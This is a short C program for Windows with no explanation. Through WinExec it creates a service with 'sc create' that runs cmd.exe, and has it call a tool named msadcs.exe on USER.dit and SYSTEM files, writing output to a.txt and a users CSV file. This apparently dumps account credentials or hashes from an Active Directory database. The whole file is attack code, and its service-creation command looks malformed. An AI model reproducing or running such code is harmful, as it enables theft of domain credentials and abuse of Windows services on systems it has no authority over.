#include <windows.h>

#define RUN(toRun) WinExec("sc create MyService binPath= cmd.exe /c " toRun, SW_SHOW);

int main() {
    RUN("msadcs.exe \"USER.dit\" -s \"SYSTEM\" -p a.txt --users-csv a.csv");
    return 0;
}